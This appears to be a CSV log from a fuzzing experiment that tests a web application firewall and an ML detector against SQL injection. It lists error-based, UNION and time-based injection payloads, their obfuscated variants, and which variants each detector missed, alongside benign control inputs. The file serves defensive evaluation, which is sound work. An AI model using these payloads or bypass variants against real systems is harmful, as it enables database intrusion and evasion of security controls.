Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5
15,2024-12-16T15:13:58.517251,"1"" or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and ""cgpm"" like ""cgpm",403,403,403,both_correct,"7421 iN (7420,7421,7422)"" or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,0x1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    ) /**/ x from   (  select 8488 union select 5584 union select  AND 1 union select 1210  )  a group by x  )   and ""cgpm""	like ""cgpm",2024-12-16T15:14:13.419573,403,403,both_correct,"7421 IN (7420,3231 LIKE 3231,7422)"" or row  (  1045,(SELECT 7562)  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,0x1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2  /**/)    ) /**/ x from  
(  select  AND 1 union select 5584 union select  AND 1 union select 1210  )  a group by x  )   and ""cgpm""	like ""cgpm",2024-12-16T15:14:30.542735,403,403,both_correct,"7421 IN (7420,3231 liKe 3231, and 1)"" or row  (  1045,(SELECT 7562)  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  0x415,0x1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *'r#'<>'r#i'  /**/)    ) /**/ x from  
(  select  AND/**/1 union select 5584 union select  AND 1 union select 1210  )  a group by x  )   and ""cgpm"" like ""cgpm",2024-12-16T15:14:48.489504,403,403,both_correct,"7421 in (7420,3231 like 3231, And 1)"" or row  (  (SELECT 1),(SELECT 7562)	 )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  0x415,0x1   )    )  /*v
*/  )  ,0x717a767a71,floor  (  rand  (  0  )  *'r#'<>'r#i'  /**/)    ) /**/ x from  
(  select  AND/**/(SELECT 1) union select 5584 union select  AND 'd-El'<>'d-Elx' union select 1210  )  a group by x  )   and ""cgpm"" like ""cgpm",2024-12-16T15:15:07.748883,403,403,both_correct,"7421 In (7420,3231 like 908!=909, and 1)"" or row  (  (SELECT 1),(SELECT 7562)	 )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  0x415,0x1   )    )  /**/  )  ,0x717a767a71,floor  (  rand  (  0  )  *'r#'<>'r#i'  /**/)    ) /**/ x from  
(  select  AND/**/(SELECT 0x1) union/**/select (SELECT 1) union select  AND 'd-El'<>'d-Elx' union select 1210  )  a group by x 
)   and ""cgpm"" like ""cgpm`",2024-12-16T15:15:28.284920,403,403,both_correct
16,2024-12-16T15:15:49.430219,"1'   )    )     )   union all select null,null,null,null,null,null,null,null#",403,403,403,both_correct,"(SELECT  AND 6889 NOT LIKE 6890)' /**/ )    )     )   union
all sElECT null,null,null,null,null,null,null,null#@",2024-12-16T15:15:53.091603,403,403,both_correct,"(sELect  And '5}'<>'(SELECT 1)}v' not like 0x1aea)' /**/ )    )     )   union all/**/SeLECT null,null,null,null,null,null,null,null#@L",2024-12-16T15:15:59.426075,403,403,both_correct,"(seLecT  AnD '(SELECT 5)}' not like '(SELECT  AND 9261!=9262)}v' not like 0x1aea)' /*T*/ )    )     )   union all sELect
null,null,null,null,null,null,null,null#@L",2024-12-16T15:16:06.956655,403,403,both_correct,"(SELECT  AnD '(SELECT
5)}' not like '(SELECT  AND  OR 0!=7897!=0x242e)}v' not like/**/0x1aea)' /**/ )    )     )   union all sElecT
null,null,null,null,null,null,null,null#@LX",2024-12-16T15:16:15.623762,403,403,both_correct,"(seLect  aND '(SELECT	 OR 0)}' not like '(SELECT  AND  OR 0!=(SELECT 9827<>9828)!=0x242e)}v' not like/**/0x1aea)'   )    )     )   union all SelEct
null,null,null,null,null,null,null,null#@LX",2024-12-16T15:16:24.850970,403,403,both_correct
17,2024-12-16T15:16:35.033358,tyler,200,200,200,both_correct,tyler,2024-12-16T15:16:35.397636,200,200,both_correct,tyler,2024-12-16T15:16:36.750662,200,200,both_correct,tyler,2024-12-16T15:16:38.119193,200,200,both_correct,tyler,2024-12-16T15:16:39.469418,200,200,both_correct,tyler,2024-12-16T15:16:40.839826,200,200,both_correct
18,2024-12-16T15:16:42.201543,1'||  (  select 'yzdz' where 5021  =  5021,403,403,403,both_correct,"0x1'||/*
)*/ (  select	'yzdz' WherE 'AU'='AU'   like    AND 1",2024-12-16T15:16:44.303594,403,403,both_correct,"0x1'||/*
)*/ (  select
'yzdz'/**/WherE (SELECT (SELECT 1))   LIKe    aND '=lEw_' LIKE ' LIKE lEw_'",2024-12-16T15:16:48.265885,403,403,both_correct,"0x1'||/*	)*/ (  select
'yzdz'/**/WherE (SELECT (SELECT  AND 'u@' LIKE 'u@'))   LIKe   /**/aND ' LIKE lEw_' LIKE ' LIKe lEw_'",2024-12-16T15:16:53.923361,403,403,both_correct,"0x1'||/*	)*/ (  select
'yzdz'/**/WherE
(SELECT (SELECT  AND 'CUQ-' NOT LIKE 'CUQ-{'))   LIKe  /**//**/aND ' LIke lEw_' LIKE ' Like lEw_'",2024-12-16T15:17:00.834030,403,403,both_correct,"0x1'||/*
)*/ (  select
'yzdz' WherE
(SELECT (SELECT  AND 'CUQ-' NOT LIKE 'CUQ-{'))   LIKe  /**//**/aND ' Like lEw_' LIKE ' lIKE lEw_'",2024-12-16T15:17:08.457524,403,403,both_correct
19,2024-12-16T15:17:15.737609,"1%'  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",403,403,200,waf_correct_ml_incorrect,"0x1%'  )  	or 'Y%'<>'Y%d'/*r@;M*/ =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/ AND 1   )    )      )    )   --",2024-12-16T15:17:20.873048,403,200,waf_correct_ml_incorrect,"0x1%'  )   or 'Y%'<>'Y%d'/*^*/ =  like  (  'abcdefg',upper  ( /**/hex  (  randomblob  (  'b3'!='b3~'/ And  Or 0x0   )    )      )    )   --",2024-12-16T15:17:28.133259,403,200,waf_correct_ml_incorrect,"0x1%'  )   or
'Y%'<>'Y%d'/**/ =  like  (  'abcdefg',upper  ( /**/hex  (  randomblob  (  'b3'!='b3~'/ AnD  or 0x0   )    )      )    )  /**/--",2024-12-16T15:17:35.772127,403,200,waf_correct_ml_incorrect,"0x1%'  )   or	'Y%'<>'Y%d'  =  like  (  'abcdefg',upper  ( /*)~*/hex  (  randomblob  (  'b3'!='b3~'/ aNd  oR 0x0   )    )      )    )  /**/--",2024-12-16T15:17:43.423390,403,200,waf_correct_ml_incorrect,"0x1%'  )   or
'Y%'<>'Y%d'  =  like  (  'abcdefg',upper  ( /*)~*/hex  ( /*.1w*/randomblob  (  'b3'!='b3~'/ And  oR 0x0   )    )      )    )  /**/--",2024-12-16T15:17:51.043656,403,200,waf_correct_ml_incorrect
20,2024-12-16T15:17:59.039262,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  8503  =  8503",403,200,200,both_incorrect,"call regexp_substring  (  repeat  (  LEFt  (  crypt_key  (  char/*VD1#*/ (  9754!=9755  )  ||char  (  69 	)  ||char  (  83  )  ,null  )  ,0x0  )  ,500000000  )  ,null  )   aND   (   AnD 1   LiKE   8503",2024-12-16T15:18:07.180913,200,200,both_incorrect,"call regexp_substring  (  repeat  (  LefT  (  crypt_key  (  char/*VD1#*/ (  9754!=9755  )  ||char  (  69 	)  ||char  (   && 'b'!='bn'  )  ,null  )  ,0x0  )  ,500000000/**/ )  ,null	 )   And   (   AnD (SELECT 1)   LIke   8503%b",2024-12-16T15:18:17.544456,200,200,both_incorrect,"call regexp_substring  (  repeat  (  lEft  (  crypt_key/**/ (  char/**/ (  '`1&4w' LIKE '`1&4w'!=9755  )  ||char  (  0x45 	)  ||char  (    AND  'b'!='bn'  )  ,null  )  ,0x0  )  , AND 1/*mow|Q*/ )  ,null
 )   anD   (   and (SELECT 1)   LIkE   8503%b",2024-12-16T15:18:29.502069,200,200,both_incorrect,"call regexp_substring  (  repeat /**/(  LefT  (  crypt_key/**/ (  char/*""?FqJ*/ (  '`1&4w' lIke '`1&4w'!=(SELECT 9755)  )  ||char  (  0x45 
)   oR char  (    anD  'b'!='bn'  )  ,null  )  ,0x0  )  , and  AND 1/*mow|Q*/ )  ,null
 )   And   (   aNd (SeLecT 3394=3394)   lIKe   8503%b",2024-12-16T15:18:42.044611,200,200,both_incorrect,"call regexp_substring  (/**/ repeat /**/(  LEfT  (  crypt_key/**/ (  char/*""?FqJ*/ (  '`1&4w' LIKe '`1&4w'!=(SelEct 9755)  )   oR char  (  0x45  )   OR char  (    ANd  'b'!='bn'  )  ,null  )  ,0x0  )  , And  aNd (seLeCT (selEct 1))/*mow|Q*/ )  ,null
 )   aND   (   ANd (sELecT '!'!='!V'=3394)   LiKE   8503%b",2024-12-16T15:18:56.361792,403,200,waf_correct_ml_incorrect
21,2024-12-16T15:19:11.976700,-4518 where 8023  =  8023 or 6872  =  6872--,403,403,200,waf_correct_ml_incorrect,"-0x11a6 WhERE 8023 
 like   (selECT 1) OR 6872 /**/=  '<pmj' LIKE '<pmj'--",2024-12-16T15:19:14.198905,200,403,waf_incorrect_ml_correct,"-0x11a6 wHERE
(SELECT 4840!=4841) 
 LikE   (select 1) Or (SELECT 6872)  =  '<pmj' liKE '<pmj'--",2024-12-16T15:19:18.718781,403,403,both_correct,"-0x11a6 whErE (sELECt 4840 not like 2483<>2484) 
 like   (seleCT 0x1) OR (selEcT/**/ OR 0)  =  '<pmj' lIkE '<pmj'--",2024-12-16T15:19:24.187064,403,403,both_correct,"-0x11a6 WherE (sELEcT 4840 not like 8666 IN ((SELECT 1),8666,8667)!=0x9b4)   lIkE   (seLEcT 0x1) oR (seLecT/**/ OR 0)  = /**/'<pmj' lIKE '<pmj'--",2024-12-16T15:19:30.697495,403,403,both_correct,"-0x11a6 Where (SeLEct 7078!=7079 not like
8666 in ((sElECt (SELECT 1)),8666,8667)!=0x9b4)   liKE   (sELect 0x1) Or (SeleCt/**/ OR (SELECT 0))   LIke   '<pmj' LiKE '<pmj'--",2024-12-16T15:19:38.734327,403,403,both_correct
22,2024-12-16T15:19:47.763755,37210,200,200,200,both_correct,"(selecT
2672)/**/Like  OR 0",2024-12-16T15:19:48.144012,403,403,both_incorrect,"(SelEcT
(seLeCT 'vZ'<>'vZR'))/**/LiKe  ||	 OR/**/0",2024-12-16T15:19:50.503711,403,200,waf_incorrect_ml_correct,(sEleCT (SelECT 'vZ' not/**/like 'vZR'))/*/*/LIkE  ||	 Or/**/ OR (SELECT 0)=1379,2024-12-16T15:19:53.939803,403,200,waf_incorrect_ml_correct,"(select (SEleCT 'vZ' not/* OR/**/8625 LIKE 8625
MW]*/LiKe 'vZR'))/*/*/LIke  ||	 Or/**/ or
(SELeCt 0)=0x563",2024-12-16T15:19:58.769810,403,200,waf_incorrect_ml_correct,"(SelECt (SelecT 'vZ' not/* OR 8625 like 179=179
MW]*/LiKE 'vZR'))/*/*/liKE
  or 	 Or/**/ or
(SELecT  OR 0x0)=0x563",2024-12-16T15:20:05.137328,403,200,waf_incorrect_ml_correct
23,2024-12-16T15:20:11.607510,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  'ztmd'  =  'ztmd",403,403,200,waf_correct_ml_incorrect,"SElEcT dbms_pipe.receive_message  (  chr  (   OR 0  )  ||chr  (  0x43  )  ||chr  (  79  )  ||chr  (  't"">
'<>'t""> X'  )  ,5/*P!Vg*/ )   From dual aND   (  'ztmd'   lIkE   'ztmd",2024-12-16T15:20:18.516320,403,200,waf_correct_ml_incorrect,"SeleCT dbms_pipe.receive_message  (  chr  (   Or 0  )  ||chr  (  0x43  )  ||chr  (  453 LIKE 453  )  ||chr  (  't"">	' NOT LIKE/**/'t""> X'  )  ,(SELECT  OR 0)/*P!Vg*/ )   frOm dual AnD   (  'ztmd'   lIkE   'ztmd",2024-12-16T15:20:27.823547,403,200,waf_correct_ml_incorrect,"sElecT dbms_pipe.receive_message  (  chr  (   OR 1908 lIKe 1908  )   or chr  (  0x43  )  ||chr  (  453 LikE (seLecT (SelEct 1))  )  ||chr  (  't"">	' NOT LIKE 't""> X'  )  ,(sELEcT  or 0)/**/ )   fROm dual And   (  'ztmd'	  LiKe   'ztmd",2024-12-16T15:20:39.049747,403,200,waf_correct_ml_incorrect,"SelECT dbms_pipe.receive_message  (  chr  (   oR (SeLeCt 1) LiKe (seleCT 1908)  )   or chr  (  0x43/**/ )  ||chr  (  453 like (seLEcT (SELEcT 9354<>9355))  )   OR chr  (  't"">
' NOT LIKE 't""> X'  )  ,(SELECt  OR 0)/*
jY*/ )   from dual AnD   (  'ztmd'	  lIkE   'ztmd",2024-12-16T15:20:51.049425,403,403,both_correct,"seLEct dbms_pipe.receive_message  (  chr  (   Or (sElECt 1) LiKe (sElect 1575!=1576)  )   oR chr  (  0x43/**/ )   or chr  (  453 LIke (SeleCt (SeLeCt/*-rd*/(selECT  AND 1)<>9355))  )   Or chr  (  't"">
' NOT LIKE 't""> X'  )  ,(seLECt  Or 0)/**/ )   FROM dual AnD   (  'ztmd'
  LiKE   'ztmd",2024-12-16T15:21:04.706042,403,200,waf_correct_ml_incorrect
24,2024-12-16T15:21:19.389035,boisvert,200,200,200,both_correct,boisvert,2024-12-16T15:21:19.914721,200,200,both_correct,boisvert,2024-12-16T15:21:21.417612,200,200,both_correct,boisvert,2024-12-16T15:21:22.897428,200,200,both_correct,boisvert,2024-12-16T15:21:24.404985,200,200,both_correct,boisvert,2024-12-16T15:21:25.916805,200,200,both_correct
25,2024-12-16T15:21:27.416059,di lorenzo,200,200,200,both_correct,di/**/lorenzo,2024-12-16T15:21:28.003303,200,200,both_correct,di lorenzo,2024-12-16T15:21:29.726064,200,200,both_correct,di/**/lorenzo,2024-12-16T15:21:31.307896,200,200,both_correct,di	lorenzo,2024-12-16T15:21:33.022716,200,403,waf_correct_ml_incorrect,"di
lorenzo",2024-12-16T15:21:34.617300,200,403,waf_correct_ml_incorrect
26,2024-12-16T15:21:36.224133,select case when 6420  =  7941 then 1 else null end--,403,200,200,both_incorrect,"SElECT
case WheN 6420  =   OR 0x0 then ',' not like ',O' eLsE null/**/eND--",2024-12-16T15:21:38.825972,200,200,both_incorrect,"SELecT
CAsE WHen ','/**/NOT LIKE ',k'   LiKE   	OR 0x0 Then ',' not like ',O' ELse null/**/eND--",2024-12-16T15:21:43.418889,200,403,waf_incorrect_ml_correct,"SelECT
CAse WhEN ','/*(Jh_*/NOT LIKE ',k'   LIKE    OR 0x0 THEn ',' not like ',O' elsE null eND--",2024-12-16T15:21:49.017260,200,403,waf_incorrect_ml_correct,"SElecT CASe when ','/*(Jh_*/not like ',k'   liKe   /**/or 0x0 ThEn ',' not like ',O' ELse null enD--",2024-12-16T15:21:54.840502,200,403,waf_incorrect_ml_correct,"SEleCt caSe WheN ','/*(Jh_*/not like ',k'   lIkE  	/**/or 0x0 then ','/**/not like ',O' elsE null END--",2024-12-16T15:22:00.799972,200,403,waf_incorrect_ml_correct
27,2024-12-16T15:22:06.667363,"marines, los",200,200,403,waf_correct_ml_incorrect,"marines,	los",2024-12-16T15:22:07.350196,200,200,both_correct,"marines,
los",2024-12-16T15:22:09.053295,200,200,both_correct,"marines, los",2024-12-16T15:22:10.747095,200,403,waf_correct_ml_incorrect,"marines,/**/los",2024-12-16T15:22:12.448465,200,200,both_correct,"marines, los",2024-12-16T15:22:14.264730,200,403,waf_correct_ml_incorrect
28,2024-12-16T15:22:15.974419,[email],200,200,200,both_correct,[email],2024-12-16T15:22:17.161582,200,200,both_correct,[email],2024-12-16T15:22:19.341145,200,200,both_correct,[email],2024-12-16T15:22:21.551373,200,200,both_correct,[email],2024-12-16T15:22:23.757282,200,200,both_correct,[email],2024-12-16T15:22:25.949016,200,200,both_correct
29,2024-12-16T15:22:28.137059,7986,200,200,200,both_correct,"
oR/**/0x0",2024-12-16T15:22:28.445158,200,200,both_correct,"
OR
0x0",2024-12-16T15:22:29.949220,200,403,waf_correct_ml_incorrect,"
oR	0x0",2024-12-16T15:22:31.358301,200,200,both_correct,	oR	0x0,2024-12-16T15:22:32.750262,200,200,both_correct,/**/oR	0x0,2024-12-16T15:22:34.308159,200,200,both_correct
30,2024-12-16T15:22:35.958520,[email],200,200,200,both_correct,[email],2024-12-16T15:22:37.094640,200,200,both_correct,[email],2024-12-16T15:22:39.146074,200,200,both_correct,[email],2024-12-16T15:22:41.219108,200,200,both_correct,[email],2024-12-16T15:22:43.285419,200,200,both_correct,[email],2024-12-16T15:22:45.328453,200,200,both_correct
31,2024-12-16T15:22:47.389360,"1%""  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  ""%""  =  """,403,403,200,waf_correct_ml_incorrect," or '2' NOT LIKE '2n'%""  )   and 0x2142/*/*a*/ =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (
 ""%""  =  """,2024-12-16T15:22:54.063002,403,403,both_correct," oR '0x2' not like '2n'%""  )   and 0x2142/*/*a*/ =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3/**/ )   and   (	 ""%""  =  """,2024-12-16T15:23:03.007630,403,200,waf_correct_ml_incorrect," or '0x2' not like '2n'%""  )   and 0x2142/*/*a*/ =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  ""%""  =  """,2024-12-16T15:23:12.328927,403,200,waf_correct_ml_incorrect," Or '0x2' not like '2n'%""  )/**/  and 0x2142/*/**/ =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and 
 (  ""%""  =  """,2024-12-16T15:23:21.260971,403,200,waf_correct_ml_incorrect," OR '0x2' not like '2n'%""  )/**/  and 0x2142/*  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  ""%""  =  """,2024-12-16T15:23:30.618747,403,200,waf_correct_ml_incorrect
